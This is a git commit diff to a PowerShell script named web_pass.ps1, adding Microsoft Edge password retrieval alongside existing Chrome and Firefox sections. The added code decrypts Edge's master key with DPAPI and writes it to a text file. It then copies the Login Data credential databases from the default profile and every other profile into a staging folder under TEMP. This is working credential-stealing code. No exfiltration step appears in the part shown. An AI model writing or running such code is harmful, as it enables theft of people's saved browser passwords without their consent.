2ac4904b8cd20d4721ebb745fb1e03bfbac29dd4
Cronix2 <clement.linossier@efrei.net>
2024-11-14 11:49:29 +0100

    Add Microsoft Edge password retrieval to web password script; create output directory and handle decryption

--- web_pass.ps1
+++ web_pass.ps1
@@ -31,6 +31,7 @@ $DestinationPath = "$env:TEMP/$FolderName"
 New-Item -Path $DestinationPath -ItemType Directory
 New-Item -Path "$DestinationPath\google" -ItemType Directory
 New-Item -Path "$DestinationPath\firefox" -ItemType Directory
+New-Item -Path "$DestinationPath\edge" -ItemType Directory
 
 # Récupération des mots de passe Google Chrome
 Add-Type -AssemblyName System.Security
@@ -64,6 +65,37 @@ foreach ($profile in $profiles) {
     }
 }
 
+# Récupération des mots de passe Microsoft Edge
+Add-Type -AssemblyName System.Security
+$localStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+$jsonData = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
+$encryptedKeyBase64 = $jsonData.os_crypt.encrypted_key
+$encryptedKey = [System.Convert]::FromBase64String($encryptedKeyBase64)
+$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
+try {
+    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+    $decryptedKeyBase64 = [Convert]::ToBase64String($decryptedKey)
+}
+catch {
+    Write-Output "Erreur lors du déchiffrement de la clé Edge : $_"
+}
+
+
+# Récupère les informations de connexion pour le profil par défaut
+Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" -Destination "$DestinationPath\edge\LoginData_0"
+Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination "$DestinationPath\edge\LocalState"
+New-Item -Path "$DestinationPath\edge\decrypted_key.txt" -ItemType File -Value $decryptedKeyBase64
+
+# Récupère les informations de connexion pour chaque profil "Profile*"
+$profiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Directory | Where-Object { $_.Name -like "Profile*" }
+$index = 1
+foreach ($profile in $profiles) {
+    $loginDataPath = Join-Path -Path $profile.FullName -ChildPath "Login Data"
+    if (Test-Path $loginDataPath) {
+        Copy-Item $loginDataPath -Destination "$DestinationPath\edge\LoginData_$index"
+        $index++
+    }
+}
 
 # Fonction pour obtenir la clé maître avec DPAPI
 function Get-MasterKey {
